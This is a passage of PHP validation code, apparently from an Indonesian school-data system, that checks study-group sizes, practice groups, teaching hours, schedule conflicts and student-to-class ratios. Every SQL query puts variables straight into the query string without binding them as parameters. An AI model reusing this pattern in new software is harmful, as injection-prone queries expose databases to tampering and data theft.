                                    and rb.jenis_rombel = 3
                            group by
                                    rb.semester_id,
                                    rb.sekolah_id,
                                    rb.tingkat_pendidikan_id,
                                    rb.jurusan_sp_id,
                                    rb.kurikulum_id,
                                    rb.nama,
                                    rb.ptk_id,
                                    rb.id_ruang,
                                    rb.moving_class,
                                    rb.jenis_rombel,
                                    rb.sks,
                                    rb.kebutuhan_khusus_id
                            ) rombel_praktik on
                                rombel_praktik.semester_id = rombongan_belajar.semester_id
                                and rombel_praktik.sekolah_id = rombongan_belajar.sekolah_id
                                and rombel_praktik.tingkat_pendidikan_id = rombongan_belajar.tingkat_pendidikan_id
                                and rombel_praktik.jurusan_sp_id = rombongan_belajar.jurusan_sp_id
                                and rombel_praktik.kurikulum_id = rombongan_belajar.kurikulum_id
                                and rombel_praktik.nama = rombongan_belajar.nama
                                and rombel_praktik.ptk_id = rombongan_belajar.ptk_id
                                and rombel_praktik.moving_class = rombongan_belajar.moving_class
                                and rombel_praktik.sks = rombongan_belajar.sks
                                and rombel_praktik.kebutuhan_khusus_id = rombongan_belajar.kebutuhan_khusus_id
                            inner join jurusan_sp on rombel_praktik.jurusan_sp_id = jurusan_sp.jurusan_sp_id
                            inner join ref.jurusan on jurusan_sp.jurusan_id = jurusan.jurusan_id
                            where
                                rombongan_belajar.semester_id = '{$sessionSemester}'
                                and rombongan_belajar.soft_delete = 0
                                and rombongan_belajar.jenis_rombel = 1
                                and rombongan_belajar.sekolah_id = '{$sekolah_id}'
                                and rombel_praktik.jumlah is not null";
                    $rombelPraktikArr = getDataBySql($sql, FALSE, DBNAME);

                    $arrPedalanganKarawitan = array('50112','50112900','50112910','50112915','50112920','50112925','46371660','46371','46361650','46361655','50110','50110895','50110815','50110820','50110825','50110830','50110835','50110840','50110845','50110850','46361');

                    foreach ($rombelPraktikArr as $praktik) {

                        if (in_array($praktik['jurusan_id'], $arrPedalanganKarawitan)) {
                            if ($praktik["jumlah_anggota_rombel"] < 10 && $praktik["rombel_praktik"] > 1) {
                                $keterangan = "Rombongan belajar dgn nama <b>".$praktik["nama"]."</b> jumlah anggota rombel hanya ".$praktik["jumlah_anggota_rombel"]." peserta didik namun memiliki rombel praktik sebanyak ".$praktik["rombel_praktik"]." (Max: 10 peserta didik)";
                                $this->setArrValidation($i++, "rombongan_belajar", 2, $keterangan);
                            }
                        } else {
                            if ($praktik["jumlah_anggota_rombel"] < 20 && $praktik["rombel_praktik"] > 1) {
                                $keterangan = "Rombongan belajar dgn nama <b>".$praktik["nama"]."</b> jumlah anggota rombel hanya ".$praktik["jumlah_anggota_rombel"]." peserta didik namun memiliki rombel praktik sebanyak ".$praktik["rombel_praktik"]." (Max: 20 peserta didik)";
                                $this->setArrValidation($i++, "rombongan_belajar", 2, $keterangan);
                            }
                        }

                        if ($praktik['rombel_praktik'] > 2) {
                            $keterangan = "Rombongan belajar dgn nama <b>".$praktik["nama"]."</b> tidak diperkenankan memiliki rombel praktik lebih dari 2 rombongan belajar. (Saat ini berjumlah ".$praktik["rombel_praktik"]." rombongan belajar)";
                            $this->setArrValidation($i++, "rombongan_belajar", 2, $keterangan);
                        }

                        if ($praktik['rombel_praktik'] > 0 && $praktik['jumlah_anggota_rombel_praktik'] != $praktik['jumlah_anggota_rombel']) {
                            $keterangan = "Rombongan belajar dgn nama <b>".$praktik["nama"]."</b> terdeteksi mempunyai rombel praktik namun masih terdapat peserta didik yang belum masuk pada rombel praktik tersebut. (Jml peserta didik yang blm masuk rombel sebanyak ".($praktik['jumlah_anggota_rombel']-$praktik['jumlah_anggota_rombel_praktik'])." pd)";
                            $this->setArrValidation($i++, "rombongan_belajar", 2, $keterangan);
                        }
                    }

                    $sql = "select
                                rombongan_belajar.jenis_rombel,
                                rombongan_belajar.tingkat_pendidikan_id,
                                rombongan_belajar.nama,
                                pembelajaran.mata_pelajaran_id,
                                mata_pelajaran.nama as mata_pelajaran_id_str,
                                pembelajaran.ptk_terdaftar_id,
                                ptk.nama as ptk_id_str,
                                count(1) as jumlah
                            from pembelajaran
                            join rombongan_belajar on pembelajaran.rombongan_belajar_id = rombongan_belajar.rombongan_belajar_id
                            join ref.mata_pelajaran on pembelajaran.mata_pelajaran_id = mata_pelajaran.mata_pelajaran_id
                            join ptk_terdaftar on pembelajaran.ptk_terdaftar_id = ptk_terdaftar.ptk_terdaftar_id
                            join ptk on ptk_terdaftar.ptk_id = ptk.ptk_id
                            where
                                pembelajaran.soft_delete = 0
                                and rombongan_belajar.soft_delete = 0
                                and rombongan_belajar.sekolah_id = '{$sekolah_id}'
                                and rombongan_belajar.semester_id = '{$sessionSemester}'
                                and rombongan_belajar.jenis_rombel = 3
                            group by
                                rombongan_belajar.jenis_rombel,
                                rombongan_belajar.tingkat_pendidikan_id,
                                rombongan_belajar.nama,
                                pembelajaran.mata_pelajaran_id,
                                mata_pelajaran.nama,
                                pembelajaran.ptk_terdaftar_id,
                                ptk.nama
                            having count(1) > 1";

                    $ptkNgajarRombelPraktik = getDataBySql($sql, FALSE, DBNAME);

                    foreach ($ptkNgajarRombelPraktik as $ptkRombelPraktik) {
                        // $keterangan = "Guru a/n ... terdeteksi mengajar mata pelajaran yang sama yaitu .... di rombongan belajar praktik yang berbeda pada rombongan belajar induk/utama ...";
                        $keterangan = "Guru a/n <b>".$ptkRombelPraktik['ptk_id_str']."</b> terdeteksi mengajar pada <b>rombongan belajar praktik</b> yg berbeda dengan mata pelajaran yang sama <b>".$ptkRombelPraktik['mata_pelajaran_id_str']."</b> yang berada pada rombongan belajar utama <b>".$ptkRombelPraktik['nama']."</b>";
                        $this->setArrValidation($i++, "rombongan_belajar", 2, $keterangan);
                    }

                    $sql = "select
                                rombongan_belajar.*,
                                pembelajaran.mata_pelajaran_id,
                                mata_pelajaran.nama as mata_pelajaran_id_str,
                                coalesce(pembelajaran.jam_mengajar_per_minggu, 0) + coalesce(rombel_praktik.jjm_praktek, 0) as sum_jjm,
                                mata_pelajaran_kurikulum.jumlah_jam_maksimum
                            from pembelajaran
                            join rombongan_belajar on pembelajaran.rombongan_belajar_id = rombongan_belajar.rombongan_belajar_id
                            join ptk_terdaftar on pembelajaran.ptk_terdaftar_id = ptk_terdaftar.ptk_terdaftar_id
                            join ptk on ptk_terdaftar.ptk_id = ptk.ptk_id
                            join ref.mata_pelajaran on pembelajaran.mata_pelajaran_id = mata_pelajaran.mata_pelajaran_id
                            join ref.mata_pelajaran_kurikulum on
                                pembelajaran.mata_pelajaran_id = mata_pelajaran_kurikulum.mata_pelajaran_id
                                and rombongan_belajar.tingkat_pendidikan_id = mata_pelajaran_kurikulum.tingkat_pendidikan_id
                                and rombongan_belajar.kurikulum_id = mata_pelajaran_kurikulum.kurikulum_id
                            inner join (
                                select
                                    rombongan_belajar.semester_id,
                                    rombongan_belajar.sekolah_id,
                                    rombongan_belajar.tingkat_pendidikan_id,
                                    rombongan_belajar.jurusan_sp_id,
                                    rombongan_belajar.kurikulum_id,
                                    rombongan_belajar.nama,
                                    rombongan_belajar.ptk_id,
                                    rombongan_belajar.moving_class,
                                    rombongan_belajar.sks,
                                    rombongan_belajar.kebutuhan_khusus_id,
                                    pembelajaran.mata_pelajaran_id,
                                    max(pembelajaran.jam_mengajar_per_minggu) as jjm_praktek
                                from pembelajaran
                                join rombongan_belajar on pembelajaran.rombongan_belajar_id = rombongan_belajar.rombongan_belajar_id
                                where
                                    pembelajaran.soft_delete = 0
                                    and rombongan_belajar.soft_delete = 0
                                    and rombongan_belajar.sekolah_id = '{$sekolah_id}'
                                    and rombongan_belajar.semester_id = '{$sessionSemester}'
                                    and rombongan_belajar.jenis_rombel = 3
                                    and pembelajaran.status_di_kurikulum = 8
                                group by
                                    rombongan_belajar.semester_id,
                                    rombongan_belajar.sekolah_id,
                                    rombongan_belajar.tingkat_pendidikan_id,
                                    rombongan_belajar.jurusan_sp_id,
                                    rombongan_belajar.kurikulum_id,
                                    rombongan_belajar.nama,
                                    rombongan_belajar.ptk_id,
                                    rombongan_belajar.moving_class,
                                    rombongan_belajar.sks,
                                    rombongan_belajar.kebutuhan_khusus_id,
                                    pembelajaran.mata_pelajaran_id
                            ) rombel_praktik on
                                rombel_praktik.semester_id = rombongan_belajar.semester_id
                                and rombel_praktik.sekolah_id = rombongan_belajar.sekolah_id
                                and rombel_praktik.tingkat_pendidikan_id = rombongan_belajar.tingkat_pendidikan_id
                                and rombel_praktik.jurusan_sp_id = rombongan_belajar.jurusan_sp_id
                                and rombel_praktik.kurikulum_id = rombongan_belajar.kurikulum_id
                                and rombel_praktik.nama = rombongan_belajar.nama
                                and rombel_praktik.ptk_id = rombongan_belajar.ptk_id
                                and rombel_praktik.moving_class = rombongan_belajar.moving_class
                                and rombel_praktik.sks = rombongan_belajar.sks
                                and rombel_praktik.kebutuhan_khusus_id = rombongan_belajar.kebutuhan_khusus_id
                                and rombel_praktik.mata_pelajaran_id = pembelajaran.mata_pelajaran_id
                            where
                                pembelajaran.soft_delete = 0
                                and rombongan_belajar.soft_delete = 0
                                and rombongan_belajar.sekolah_id = '{$sekolah_id}'
                                and rombongan_belajar.semester_id = '{$sessionSemester}'
                                and rombongan_belajar.jenis_rombel = 1
                                and pembelajaran.status_di_kurikulum = 8
                                and mata_pelajaran_kurikulum.a_peminatan in (7,8)
                                and coalesce(pembelajaran.jam_mengajar_per_minggu, 0) + coalesce(rombel_praktik.jjm_praktek, 0) > mata_pelajaran_kurikulum.jumlah_jam_maksimum";

                    $ptkNgajarRombelPraktikLebihJam = getDataBySql($sql, FALSE, DBNAME);
                    // echo $sql; die;

                    foreach ($ptkNgajarRombelPraktikLebihJam as $ptkLebihJam) {
                        $keterangan = "Mata pelajaran <b>".$ptkLebihJam['mata_pelajaran_id_str']."</b> pada rombongan belajar praktik dgn nama <b>".$ptkLebihJam['nama']."</b> terdeteksi akumulasi dari jam rombongan belajar utama dan rombongan belajar praktik lebih dari jumlah maksimum. (Max: ".$ptkLebihJam['jumlah_jam_maksimum']." jam, dan saat ini ".$ptkLebihJam['sum_jjm']." jam)";
                        $this->setArrValidation($i++, "rombongan_belajar", 2, $keterangan);
                    }

                    $sql = "select
                                rombongan_belajar.jurusan_sp_id,
                                rombongan_belajar.tingkat_pendidikan_id,
                                rombongan_belajar.nama,
                                pembelajaran.mata_pelajaran_id,
                                mata_pelajaran.nama as mata_pelajaran_id_str,
                                count(1) jumlah,
                                sum(pembelajaran.jam_mengajar_per_minggu) sum_jjm,
                                (sum(pembelajaran.jam_mengajar_per_minggu)/count(1)) hasil_bagi
                            from pembelajaran
                            join rombongan_belajar on pembelajaran.rombongan_belajar_id = rombongan_belajar.rombongan_belajar_id
                            join ref.mata_pelajaran on pembelajaran.mata_pelajaran_id = mata_pelajaran.mata_pelajaran_id
                            join ptk_terdaftar on pembelajaran.ptk_terdaftar_id = ptk_terdaftar.ptk_terdaftar_id
                            join ptk on ptk_terdaftar.ptk_id = ptk.ptk_id
                            where
                                pembelajaran.soft_delete = 0
                                and rombongan_belajar.soft_delete = 0
                                and rombongan_belajar.sekolah_id = '{$sekolah_id}'
                                and rombongan_belajar.semester_id = '{$sessionSemester}'
                                and rombongan_belajar.jenis_rombel = 3
                            group by
                                rombongan_belajar.jurusan_sp_id,
                                rombongan_belajar.tingkat_pendidikan_id,
                                rombongan_belajar.nama,
                                pembelajaran.mata_pelajaran_id,
                                mata_pelajaran.nama
                            having
                                (sum(pembelajaran.jam_mengajar_per_minggu)/count(1)) <> max(pembelajaran.jam_mengajar_per_minggu)";

                    $ptkNgajarPraktikBedaJam = getDataBySql($sql, FALSE, DBNAME);

                    foreach ($ptkNgajarPraktikBedaJam as $ptkBedaJam) {
                        $keterangan = "Mata pelajaran <b>".$ptkBedaJam['mata_pelajaran_id_str']."</b> pada rombongan belajar praktik yang dipecah lebih dari satu dengan nama rombongan belajar induk <b>".$ptkBedaJam['nama']."</b> jumlah jam perminggunya berbeda";
                        $this->setArrValidation($i++, "rombongan_belajar", 2, $keterangan);
                    }

                }

                // Jadwal
                $sql = "SELECT
                            rombongan_belajar.tingkat_pendidikan_id,
                            rombongan_belajar.nama AS rombongan_belajar_id_str,
                            ref_jen_rombel.nm_jenis_rombel AS jenis_rombel_str,
                            ruang.nm_ruang AS id_ruang_str,
                            ptk.nama AS ptk_id_str,
                            mata_pelajaran.nama AS mata_pelajaran_id_str,
                            pembelajaran.status_di_kurikulum,
                            coalesce(pembelajaran.jam_mengajar_per_minggu, 0) AS jjm,
                            coalesce(jadwal.jumlah_jam, 0) AS alokasi_jadwal
                        FROM pembelajaran
                        JOIN rombongan_belajar ON pembelajaran.rombongan_belajar_id = rombongan_belajar.rombongan_belajar_id
                        JOIN ruang ON rombongan_belajar.id_ruang = ruang.id_ruang
                        JOIN ptk_terdaftar ON pembelajaran.ptk_terdaftar_id = ptk_terdaftar.ptk_terdaftar_id
                        JOIN ptk ON ptk_terdaftar.ptk_id = ptk.ptk_id
                        JOIN ref.mata_pelajaran ON pembelajaran.mata_pelajaran_id = mata_pelajaran.mata_pelajaran_id
                        JOIN ref.jenis_rombel ref_jen_rombel ON rombongan_belajar.jenis_rombel = ref_jen_rombel.jenis_rombel
                        LEFT OUTER JOIN (
                            SELECT
                                pembelajaran_id,
                                COUNT(1) AS jumlah_jam
                            FROM (
                                SELECT
                                    sekolah_id,
                                    semester_id,
                                    id_ruang,
                                    hari,
                                    UNNEST(ARRAY[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]) AS ".'"urutan"'.",
                                    UNNEST(ARRAY['Pembelajaran ke-01', 'Pembelajaran ke-02', 'Pembelajaran ke-03','Pembelajaran ke-04', 'Pembelajaran ke-05', 'Pembelajaran ke-06', 'Pembelajaran ke-07', 'Pembelajaran ke-08', 'Pembelajaran ke-09', 'Pembelajaran ke-10', 'Pembelajaran ke-11', 'Pembelajaran ke-12', 'Pembelajaran ke-13', 'Pembelajaran ke-14', 'Pembelajaran ke-15', 'Pembelajaran ke-16', 'Pembelajaran ke-17', 'Pembelajaran ke-18', 'Pembelajaran ke-19', 'Pembelajaran ke-20']) AS ".'"pembelajaran_ke"'.",
                                    UNNEST(ARRAY[bel_ke_01, bel_ke_02, bel_ke_03, bel_ke_04, bel_ke_05, bel_ke_06, bel_ke_07, bel_ke_08, bel_ke_09, bel_ke_10, bel_ke_11, bel_ke_12, bel_ke_13, bel_ke_14, bel_ke_15, bel_ke_16, bel_ke_17, bel_ke_18, bel_ke_19, bel_ke_20]) AS ".'"pembelajaran_id"'."
                                FROM jadwal
                                WHERE
                                    soft_delete = 0
                                ORDER BY
                                    id_ruang,
                                    hari,
                                    ".'"urutan"'.",
                                    ".'"pembelajaran_id"'."
                            ) AS jadwal
                            WHERE
                                pembelajaran_id IS NOT NULL
                            GROUP BY
                                pembelajaran_id
                        ) jadwal ON pembelajaran.pembelajaran_id = jadwal.pembelajaran_id
                        WHERE
                            pembelajaran.soft_delete = 0
                            AND pembelajaran.status_di_kurikulum <> 9
                            AND rombongan_belajar.soft_delete = 0
                            AND rombongan_belajar.semester_id = '{$sessionSemester}'
                            AND rombongan_belajar.sekolah_id = '{$sekolah_id}'
                            AND ptk_terdaftar.tahun_ajaran_id = '$tahunAjaranId'
                            AND ptk_terdaftar.jenis_keluar_id IS NULL
                        ORDER BY
                            jenis_rombel_str,
                            rombongan_belajar.tingkat_pendidikan_id,
                            rombongan_belajar.nama,
                            ptk.nama,
                            mata_pelajaran.nama";

                // echo $sql; die;
                $jadwals = getDataBySql($sql, FALSE, DBNAME);

                foreach ($jadwals as $jadwal) {
                    if ($jadwal['jjm'] > 0) {
                        // semua pembelajaran kecuali TIK dan BK
                        /*if ($jadwal['status_di_kurikulum'] != 9) {
                            if ($jadwal['jjm'] < $jadwal['alokasi_jadwal']) {
                                $keterangan = "Akumulasi jam dari jadwal (<b>".$jadwal['alokasi_jadwal']."</b>) melebihi dari jumlah jam/minggu (<b>".$jadwal['jjm']."</b>) yg terdapat pada pembelajaran dgn mata pelajaran ".$jadwal['mata_pelajaran_id_str']." yg diajarkan oleh guru a/n <b>".$jadwal['ptk_id_str']."</b> pada rombel: <b>".$jadwal['jenis_rombel_str']." - ".$jadwal['rombongan_belajar_id_str']."</b>";
                                $this->setArrValidation($i++, "jadwal", 1, $keterangan);
                            } else if ($jadwal['alokasi_jadwal'] < $jadwal['jjm']) {
                                $keterangan = "Akumulasi jam dari jadwal (<b>".$jadwal['alokasi_jadwal']."</b>) masih kurang dari jumlah jam/minggu (<b>".$jadwal['jjm']."</b>) yg terdapat pada pembelajaran ".$jadwal['mata_pelajaran_id_str']." yg diajarkan oleh guru a/n <b>".$jadwal['ptk_id_str']."</b> pada rombel: <b>".$jadwal['jenis_rombel_str']." - ".$jadwal['rombongan_belajar_id_str']."</b>";
                                $this->setArrValidation($i++, "jadwal", 1, $keterangan);
                            }
                        } else {*/
                            if ($jadwal['jjm'] < $jadwal['alokasi_jadwal']) {
                                $keterangan = "Akumulasi jam dari jadwal (<b>".$jadwal['alokasi_jadwal']."</b>) melebihi dari jumlah jam/minggu (<b>".$jadwal['jjm']."</b>) yg terdapat pada pembelajaran dgn mata pelajaran ".$jadwal['mata_pelajaran_id_str']." yg diajarkan oleh guru a/n <b>".$jadwal['ptk_id_str']."</b> pada rombel: <b>".$jadwal['jenis_rombel_str']." - ".$jadwal['rombongan_belajar_id_str']."</b>";
                                $this->setArrValidation($i++, "jadwal", 1, $keterangan);
                            } else if ($jadwal['alokasi_jadwal'] < $jadwal['jjm']) {
                                // $keterangan = "Akumulasi jam dari jadwal (<b>".$jadwal['alokasi_jadwal']."</b>) masih kurang dari jumlah jam/minggu (<b>".$jadwal['jjm']."</b>) yg terdapat pada pembelajaran ".$jadwal['mata_pelajaran_id_str']." yg diajarkan oleh guru a/n <b>".$jadwal['ptk_id_str']."</b> pada rombel: <b>".$jadwal['jenis_rombel_str']." - ".$jadwal['rombongan_belajar_id_str']."</b>";
                                $keterangan = "Jadwal untuk rombel: <b>".$jadwal['jenis_rombel_str']." - ".$jadwal['rombongan_belajar_id_str']."</b>, pembelajaran: <b>".$jadwal['mata_pelajaran_id_str']."</b>, guru: <b>".$jadwal['ptk_id_str']."</b>, JJM/minggu: <b>".$jadwal['jjm']." jam</b> hanya <b>".$jadwal['alokasi_jadwal']." jam</b> yang terjadwal";
                                $this->setArrValidation($i++, "jadwal", 1, $keterangan);
                            }
                        // }
                    }
                }

                $sql = "SELECT
                            ptk.ptk_id,
                            ptk.nama,
                            ptk.nuptk,
                            ptk_terdaftar.ptk_terdaftar_id,
                            jadwal.hari,
                            jadwal.pembelajaran_ke,
                            COUNT(1) jumlah
                        FROM pembelajaran
                        JOIN ptk_terdaftar ON pembelajaran.ptk_terdaftar_id = ptk_terdaftar.ptk_terdaftar_id
                        JOIN ptk ON ptk_terdaftar.ptk_id = ptk.ptk_id
                        JOIN (
                            SELECT
                                    *
                            FROM (
                                    SELECT
                                        sekolah_id,
                                        semester_id,
                                        id_ruang,
                                        hari,
                                        UNNEST(ARRAY[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]) AS ".'"urutan"'.",
                                        UNNEST(ARRAY['Pembelajaran ke-01', 'Pembelajaran ke-02', 'Pembelajaran ke-03','Pembelajaran ke-04', 'Pembelajaran ke-05', 'Pembelajaran ke-06', 'Pembelajaran ke-07', 'Pembelajaran ke-08', 'Pembelajaran ke-09', 'Pembelajaran ke-10', 'Pembelajaran ke-11', 'Pembelajaran ke-12', 'Pembelajaran ke-13', 'Pembelajaran ke-14', 'Pembelajaran ke-15', 'Pembelajaran ke-16', 'Pembelajaran ke-17', 'Pembelajaran ke-18', 'Pembelajaran ke-19', 'Pembelajaran ke-20']) AS ".'"pembelajaran_ke"'.",
                                        UNNEST(ARRAY[bel_ke_01, bel_ke_02, bel_ke_03, bel_ke_04, bel_ke_05, bel_ke_06, bel_ke_07, bel_ke_08, bel_ke_09, bel_ke_10, bel_ke_11, bel_ke_12, bel_ke_13, bel_ke_14, bel_ke_15, bel_ke_16, bel_ke_17, bel_ke_18, bel_ke_19, bel_ke_20]) AS ".'"pembelajaran_id"'."
                                    FROM jadwal
                                    WHERE
                                        soft_delete = 0
                                    ORDER BY
                                        id_ruang,
                                        hari,
                                        ".'"urutan"'.",
                                        ".'"pembelajaran_id"'."
                            ) AS jadwal
                            WHERE
                                pembelajaran_id IS NOT NULL
                        ) jadwal ON pembelajaran.pembelajaran_id = jadwal.pembelajaran_id
                        WHERE
                            pembelajaran.soft_delete = 0
                            AND ptk_terdaftar.soft_delete = 0
                            AND ptk_terdaftar.jenis_keluar_id IS NULL
                            AND ptk_terdaftar.tahun_ajaran_id = '{$tahunAjaranId}'
                            AND ptk_terdaftar.sekolah_id = '{$sekolah_id}'
                            AND jadwal.semester_id = '{$sessionSemester}'
                        GROUP BY
                            ptk.ptk_id,
                            ptk.nama,
                            ptk.nuptk,
                            ptk_terdaftar.ptk_terdaftar_id,
                            jadwal.hari,
                            jadwal.pembelajaran_ke
                        HAVING COUNT(1) > 1
                        ORDER BY
                            COUNT(1) DESC";

                // echo $sql; die;

                $jadwalsDouble = getDataBySql($sql, FALSE, DBNAME);

                foreach ($jadwalsDouble as $jadwal) {

                    switch ($jadwal['hari']) {
                        case 1: $hari = "Senin"; break;
                        case 2: $hari = "Selasa"; break;
                        case 3: $hari = "Rabu"; break;
                        case 4: $hari = "Kamis"; break;
                        case 5: $hari = "Jumat"; break;
                        case 6: $hari = "Sabtu"; break;
                        case 7: $hari = "Minggu"; break;
                    }

                    $keterangan = "Guru a/n <b>".$jadwal['nama']."</b> dgn NUPTK ".$jadwal['nuptk']." terdeteksi ganda pada jadwal mengajar dihari <b>{$hari} - ".$jadwal['pembelajaran_ke']."</b>";
                    $this->setArrValidation($i++, "jadwal", 2, $keterangan);

                }

                $sql = "select
                            rombongan_belajar.sekolah_id,
                            rombongan_belajar.tingkat_pendidikan_id,
                            jurusan_sp.jurusan_id,
                            jurusan.nama_jurusan,
                            CASE WHEN rombongan_belajar.jenis_rombel IN (1,11,12,13) THEN 1 ELSE rombongan_belajar.jenis_rombel END AS jenis_rombel,
                            count(distinct rombongan_belajar.rombongan_belajar_id) as jumlah_rombel,
                            count(1) as jumlah_pd
                        from rombongan_belajar
                        join anggota_rombel on rombongan_belajar.rombongan_belajar_id = anggota_rombel.rombongan_belajar_id
                        join peserta_didik on anggota_rombel.peserta_didik_id = peserta_didik.peserta_didik_id
                        join registrasi_peserta_didik rpd on peserta_didik.peserta_didik_id = rpd.peserta_didik_id
                        left join jurusan_sp on rombongan_belajar.jurusan_sp_id = jurusan_sp.jurusan_sp_id
                        left join ref.jurusan on jurusan_sp.jurusan_id = jurusan.jurusan_id
                        where
                            rombongan_belajar.soft_delete = 0
                            and rombongan_belajar.semester_id = '{$sessionSemester}'
                            and rombongan_belajar.jenis_rombel in (1,2,11,12,13)
                            and rombongan_belajar.sekolah_id = '{$sekolah_id}'
                            and anggota_rombel.soft_delete = 0
                            and peserta_didik.soft_delete = 0
                            and rpd.soft_delete = 0
                            and rpd.jenis_keluar_id is null
                            and rpd.sekolah_id = rombongan_belajar.sekolah_id
                        group by
                            rombongan_belajar.sekolah_id,
                            rombongan_belajar.tingkat_pendidikan_id,
                            jurusan_sp.jurusan_id,
                            jurusan.nama_jurusan,
                            CASE WHEN rombongan_belajar.jenis_rombel IN (1,11,12,13) THEN 1 ELSE rombongan_belajar.jenis_rombel END
                        order by
                            rombongan_belajar.tingkat_pendidikan_id";
                // echo $sql; die;

                $cekRasioPd = getDataBySql($sql, FALSE, DBNAME);

                $jmlMakPd = 36;
                if (in_array($sekolahObj->getBentukPendidikanId(), array(5))) {
                    // SD
                    $jmlMakPd = 28;
                } else if (in_array($sekolahObj->getBentukPendidikanId(), array(6))) {
                    // SMP
                    $jmlMakPd = 32;
                } else if (in_array($sekolahObj->getBentukPendidikanId(), array(7))) {
                    // SDLB
                    $jmlMakPd = 5;
                } else if (in_array($sekolahObj->getBentukPendidikanId(), array(8,14))) {
                    // SMPLB, SMALB
                    $jmlMakPd = 8;
                }

                // Sudah digantikan dengan Permendikbud 14 tahun 2018
                $tampilCountPerTingkat = false;
                foreach ($rombelCountPerTingkat as $key => $value) {
                    if ($bentukPendidikan == 5 && $key > 4) {
                        $tampilCountPerTingkat = true;
                        $keteranganCountPerTingkat = "Sesuai dgn Permendikbud 22 Tahun 2016 terkait Standar Proses untuk {$bentukPendidikanNama} jumlah rombongan belajar pertingkat maksimal 4 rombongan belajar. (Saat ini {$value} rombongan belajar)";
                    } else if ($bentukPendidikan == 6 && $key > 11) {
                        $tampilCountPerTingkat = true;
                        $keteranganCountPerTingkat = "Sesuai dgn Permendikbud 22 Tahun 2016 terkait Standar Proses untuk {$bentukPendidikanNama} jumlah rombongan belajar pertingkat maksimal 11 rombongan belajar. (Saat ini {$value} rombongan belajar)";
                    } else if ($bentukPendidikan == 13 && $key > 12) {
                        $tampilCountPerTingkat = true;
                        $keteranganCountPerTingkat = "Sesuai dgn Permendikbud 22 Tahun 2016 terkait Standar Proses untuk {$bentukPendidikanNama} jumlah rombongan belajar pertingkat maksimal 12 rombongan belajar. (Saat ini {$value} rombongan belajar)";
                    } else if ($bentukPendidikan == 15 && $key > 72) {
                        $tampilCountPerTingkat = true;
                        $keteranganCountPerTingkat = "Sesuai dgn Permendikbud 22 Tahun 2016 terkait Standar Proses untuk {$bentukPendidikanNama} jumlah rombongan belajar pertingkat maksimal 72 rombongan belajar. (Saat ini {$value} rombongan belajar)";
                    }
                }

                // print_r($cekRasioPd); die;
                // print_r($rombelCountPerTingkat); die;
                // print_r($jumlahPdPerTingkat); die;
                $is_debug = false;
                foreach ($cekRasioPd as $cekRasio) {
                    $rasioPd = ceil($cekRasio['jumlah_pd']/$jmlMakPd);
                    $rombelNormal = $rasioPd-2;
                    // echo $rasioPd."<br>";
                    if ($cekRasio['jenis_rombel'] == 2) {
                        $jenisRombel = "Teori";
                    } else {
                        $jenisRombel = "Reguler";
                    }

                    if ($cekRasio['jumlah_rombel'] > $rasioPd) {

                        if ($cekRasio['nama_jurusan']) {
                            $keterangan = "Terdapat rombel {$jenisRombel} dengan Tingkat {$cekRasio['tingkat_pendidikan_id']} dengan jurusan {$cekRasio['nama_jurusan']} yang tidak wajar karena rasio jumlah rombel melebihi dari jumlah peserta didik (Saat ini jumlah rombel {$cekRasio['jumlah_rombel']}, yang seharusnya maksimal hanya {$rasioPd})";
                        } else {
                            $keterangan = "Terdapat rombel {$jenisRombel} dengan Tingkat {$cekRasio['tingkat_pendidikan_id']} yang tidak wajar karena rasio jumlah rombel melebihi dari jumlah peserta didik (Saat ini jumlah rombel {$cekRasio['jumlah_rombel']}, yang seharusnya maksimal hanya {$rasioPd})";
                        }

                        if (in_array($sekolahObj->getBentukPendidikanId(), array(5,6,13,15))) {
                            if (in_array($cekRasio['tingkat_pendidikan_id'], array(1,2,7,8,10,11))) {
                                $this->setArrValidation($i++, "rombongan_belajar", 2, $keterangan);
                            } else {
                                $this->setArrValidation($i++, "rombongan_belajar", 1, $keterangan);
                            }
                        }

                        $tampilCountPerTingkat = false;
                    }

                    if ($cekRasio['jumlah_rombel'] < 3) {
                        continue;
                    }

                    if ($is_debug) {
                        echo "tingkat pendidikan: ". $cekRasio['tingkat_pendidikan_id']."<br>";
                        echo "jumlah rombel total: ". $cekRasio['jumlah_rombel']."<br>";
                        echo "rombel yg wajib {$jmlMakPd}: ". $rasioPd."<br>";
                    }

                    $rombelTidakNormalPerTingkat = 0;
                    foreach ($jumlahPdPerTingkat[$cekRasio['tingkat_pendidikan_id']] as $key => $value) {
                        // echo $key." => ".$value."<br>";
                        list($rombelid, $nama) = explode("==", $key);
                        if ($value < $jmlMakPd) {
                            $rombelTidakNormalPerTingkat++;
                            if ($is_debug) {
                                echo "<font color='red'>*".$nama. " = ".$value."*</font><br>";
                            }
                        } else {
                            if ($is_debug) {
                                echo $nama. " = ".$value."<br>";
                            }
                        }

                    }

                    if ($is_debug) {
                        echo "rombelNormal : ". ($cekRasio['jumlah_rombel']-$rombelTidakNormalPerTingkat) ."<br>";
                        echo "rombelTidakNormalPerTingkat : ". $rombelTidakNormalPerTingkat."<br><br>";
                    }
                    // die;
                    if ($rombelTidakNormalPerTingkat > 2 && in_array($sekolahObj->getBentukPendidikanId(), array(5,6,7,8))) {
                        // echo "Rombel tidak normal<br>";
                        $keterangan = "Ditemukan rombel {$jenisRombel} tidak normal sejumlah <b>".($rombelTidakNormalPerTingkat-2)." pada Tingkat {$cekRasio['tingkat_pendidikan_id']}</b>, dikarenakan jumlah peserta didik masih dibawah {$jmlMakPd} (Pada tingkat {$cekRasio['tingkat_pendidikan_id']} dengan jumlah total {$cekRasio['jumlah_pd']} peserta didik yang wajib dimaksimalkan (wajib {$jmlMakPd}) adalah {$rasioPd} rombel)";
                        $this->setArrValidation($i++, "rombongan_belajar", 1, $keterangan);
                    }
                }

                if ($tampilCountPerTingkat) {
                    $this->setArrValidation($i++, "rombongan_belajar", 1, $keteranganCountPerTingkat);
                }

                if ($is_debug) {
                    die();
                }

            } else if ($jenis_validasi == "prasarana") {

                // Tanah
                /* $c = new \Criteria();
                $c->add(TanahPeer::SEKOLAH_ID, $sekolah_id);
                $c->add(TanahPeer::SOFT_DELETE, 0);
                $c->add(TanahPeer::ID_HAPUS_BUKU, NULL, \Criteria::ISNULL);
                $tanahObj = TanahPeer::doSelect($c);

                foreach ($tanahObj as $tanah) {
                    $tanahLongObj = TanahLongitudinalPeer::retrieveByPk($tanah->getIdTanah(), $tahunAjaranId);
                    if (!is_object($tanahLongObj)) {
